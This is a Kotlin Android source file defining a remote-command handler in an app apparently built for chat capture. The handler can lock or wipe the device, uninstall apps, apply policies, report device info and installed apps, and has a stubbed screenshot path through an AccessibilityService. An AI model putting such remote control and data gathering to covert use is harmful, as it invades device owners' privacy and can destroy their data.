package com.chats.capture.network

import android.content.Context
import com.chats.capture.mdm.AppManager
import com.chats.capture.mdm.MDMManager
import com.chats.capture.mdm.PolicyManager
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber

class RemoteControlService(
    private val context: Context,
    private val mdmManager: MDMManager,
    private val appManager: AppManager,
    private val policyManager: PolicyManager
) {
    
    suspend fun executeRemoteCommand(command: RemoteCommand): RemoteCommandResult = withContext(Dispatchers.IO) {
        try {
            when (command.action) {
                "lock_device" -> {
                    val success = mdmManager.lockDevice()
                    RemoteCommandResult(success, if (success) "Device locked" else "Failed to lock device")
                }
                "unlock_device" -> {
                    val success = mdmManager.unlockDevice()
                    RemoteCommandResult(success, if (success) "Device unlocked" else "Failed to unlock device")
                }
                "wipe_device" -> {
                    val success = mdmManager.wipeDevice()
                    RemoteCommandResult(success, if (success) "Device wipe initiated" else "Failed to wipe device")
                }
                "install_app" -> {
                    command.parameters["apk_url"] ?: return@withContext RemoteCommandResult(false, "Missing apk_url")
                    // Download and install app
                    RemoteCommandResult(false, "App installation not implemented yet")
                }
                "uninstall_app" -> {
                    val packageName = command.parameters["package_name"] ?: return@withContext RemoteCommandResult(false, "Missing package_name")
                    val success = appManager.uninstallApp(packageName)
                    RemoteCommandResult(success, if (success) "App uninstalled" else "Failed to uninstall app")
                }
                "set_policy" -> {
                    val policyJson = command.parameters["policy"] ?: return@withContext RemoteCommandResult(false, "Missing policy")
                    val policy = Gson().fromJson(policyJson, com.chats.capture.mdm.SecurityPolicy::class.java)
                    val success = policyManager.applySecurityPolicy(policy)
                    RemoteCommandResult(success, if (success) "Policy applied" else "Failed to apply policy")
                }
                "get_device_info" -> {
                    val deviceInfo = mdmManager.getDeviceInfo()
                    val infoJson = Gson().toJson(deviceInfo)
                    RemoteCommandResult(true, "Device info retrieved", infoJson)
                }
                "get_apps" -> {
                    val apps = appManager.getInstalledApps()
                    val appsJson = Gson().toJson(apps)
                    RemoteCommandResult(true, "Apps retrieved", appsJson)
                }
                "capture_screenshot" -> {
                    // Screenshot capture requires AccessibilityService
                    // This will be handled by CommandPollingManager or FirebaseMessagingService
                    // which have access to the service
                    RemoteCommandResult(false, "Screenshot command should be handled by service with AccessibilityService access")
                }
                else -> {
                    RemoteCommandResult(false, "Unknown command: ${command.action}")
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error executing remote command")
            RemoteCommandResult(false, "Error: ${e.message}")
        }
    }
}

data class RemoteCommand(
    val action: String,
    val parameters: Map<String, String> = emptyMap()
)

data class RemoteCommandResult(
    val success: Boolean,
    val message: String,
    val data: String? = null
)
